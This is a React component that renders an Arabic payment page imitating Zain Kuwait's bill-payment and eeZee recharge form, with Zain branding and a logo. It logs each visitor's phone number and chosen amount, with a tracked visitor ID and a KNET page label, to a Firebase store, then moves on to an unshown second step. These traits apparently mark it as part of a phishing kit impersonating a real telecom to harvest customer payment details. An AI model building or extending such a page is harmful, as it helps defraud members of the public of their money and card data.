"use client";

import type React from "react";
import { useState, useEffect, useCallback } from "react";
import { AlertCircle, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Badge } from "@/components/ui/badge";
// Assuming these are correctly set up in your project
import { addData } from "@/lib/firebase";
import LoaderApp from "@/components/loader";
import "./zzzzz.css";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";

// Placeholder functions to avoid errors if lib files are not present

export default function ZainPaymentForm({ setShow, setStepNumber }: any) {
  const [phone, setPhone] = useState("");
  const [paymentType, setPaymentType] = useState("other");
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [amount, setAmount] = useState("6.00");
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  const [phoneError, setPhoneError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("bill");
  const renderAmountSelection = () =>
    phone.length === 8 &&
    !phoneError && (
      <div className="space-y-3">
        <Label className="text-sm font-medium text-slate-800">
          {activeTab === "bill"
            ? "اختر مبلغ الفاتورة"
            : "اختر باقة إعادة التعبئة"}
        </Label>
        <div className="w-full">
          <Select key={selectedAmount} onValueChange={handleAmountSelect}>
            <SelectTrigger className="text-left">
              <div className="text-xs opacity-90 flex">
                <div className="mx-1"> د.ك</div>
                <div className="mx-1"> {selectedAmount || 6}</div>
              </div>
            </SelectTrigger>
            <SelectContent>
              {currentAmounts.map((value) => (
                <SelectItem value={value.toString()}>
                  <div className="text-center">
                    <div className="font-bold text-sm">{value}.000</div>
                    <div className="text-xs opacity-90">د.ك</div>
                  </div>
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
      </div>
    );
  useEffect(() => {
    localStorage.setItem("amount", amount);
  }, [amount]);

  useEffect(() => {
    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.");
    } else {
      setPhoneError("");
    }
  }, [phone]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "");
    if (value.length <= 8) {
      setPhone(value);
    }
  };

  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value);
    localStorage.setItem("amount", value); // Consider if this is necessary or should be component state only
    setAmount(value);
  };

  const handleSubmit = async (e: any) => {
    const visitorId = localStorage.getItem("visitor");
    e.preventDefault();
    setIsLoading(true);
    try {
      await addData({
        id: visitorId,
        phone: phone, // Storing phone number, ensure compliance with privacy regulations
        amount: amount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت ",
        action: "payment_submit_attempt",
      }).then(() => {
        setStepNumber(2);
      });
    } catch (error) {
      console.error("Submission error:", error);
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error),
      });
      // Handle error display to user
    } finally {
      setIsLoading(false);
    }
  };

  const isFormValid = phone.length === 8 && Number.parseInt(amount) > 0;

  const billAmounts = ["6", "10", "15", "20", "30", "50"];
  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"];
  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;

  const renderPhoneNumberInput = () => (
    <div className="space-y-2">
      <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
        <span>رقم الهاتف</span>
        <Badge
          variant="outline"
          className="text-xs font-normal border-primary/50 text-primary"
        >
          مطلوب
        </Badge>
      </Label>
      <div className="relative">
        <Input
          type="tel"
          style={{
            height: 35,
            outline: 0,
            border: "1px gray solid",
            boxShadow: "none",
          }}
          placeholder="XXXXXXXX"
          value={phone}
          onChange={handlePhoneChange}
          maxLength={8}
          className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-right
            ${
              phoneError
                ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                : "border-slate-300"
            }
            ${
              phone.length === 8 && !phoneError
                ? "border-green-500 focus:border-green-500 focus:ring-green-500"
                : ""
            }`}
          dir="rtl" // Keep ltr for phone number input
        />
        {phone.length === 8 && !phoneError && (
          <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
        )}
        {phoneError && phone.length > 0 && (
          <AlertCircle className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
        )}
      </div>
      {phoneError && (
        <div className="flex items-center gap-2 text-xs text-red-600 pt-1">
          <AlertCircle className="w-4 h-4 flex-shrink-0" />
          <p>{phoneError}</p>
        </div>
      )}
    </div>
  );

  const renderTermsAndConditions = (idPrefix: string) => (
    <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
      <div className="flex items-start gap-3">
        <Checkbox
          id={`${idPrefix}-terms`}
          checked={termsAccepted}
          onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
          className="mt-0.5 data-[state=checked]:bg-primary data-[state=checked]:border-primary border-slate-400"
          aria-labelledby={`${idPrefix}-terms-label`}
        />
        <div className="grid gap-1.5 leading-none">
          <Label
            htmlFor={`${idPrefix}-terms`}
            id={`${idPrefix}-terms-label`}
            className="text-sm font-medium cursor-pointer text-slate-700 hover:text-primary transition-colors"
          >
            أوافق على الشروط والأحكام
          </Label>
          <p className="text-xs text-slate-500">
            بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
          </p>
        </div>
      </div>
    </div>
  );

  return (
    <>
      <header className="zain-header">
        <div className="zain-header-logo">
          <img src="/top.webp" className="object-contain" />
        </div>
      </header>
      <form
        onSubmit={handleSubmit}
        className="zain-form-container"
        style={{ marginTop: 25 }}
      >
        <div className="zain-form-card">
          <div className="zain-tabs" style={{ fontSize: 13 }}>
            <button
              type="button"
              onClick={() => setActiveTab("bill")}
              className={`zain-tab-button ${
                activeTab === "bill" ? "zain-tab-active" : "zain-tab-inactive"
              }`}
            >
              دفع الفاتورة
            </button>
            <button
              type="button"
              onClick={() => setActiveTab("ess")}
              className={`zain-tab-button ${
                activeTab === "ess" ? "zain-tab-active" : "zain-tab-inactive"
              }`}
            >
              إعادة تعبئة eeZee
            </button>
          </div>

          <h2 className="zain-form-title">أود أن أعيد التعبئة لـ</h2>

          <div className="zain-phone-container">{renderPhoneNumberInput()}</div>

          <div className="zain-form-group">{renderAmountSelection()}</div>

          <div className="text-center mb-4">
            <button className="zain-add-number-button" disabled>
              + أضف رقم آخر
            </button>
          </div>

          <hr className="zain-divider" />

          <div className="zain-total-section" style={{ fontSize: 17 }}>
            <span className="zain-total-label">إجمالي</span>
            <span className="zain-total-amount">
              {parseFloat(amount).toFixed(3)} د.ك
            </span>
          </div>

          <button
            disabled={!isFormValid}
            className={`zain-submit-button ${
              isFormValid ? "enabled" : "disabled"
            }`}
          >
            أعد التعبئة الآن
          </button>
        </div>
        {isLoading && <LoaderApp />}
      </form>
    </>
  );
}
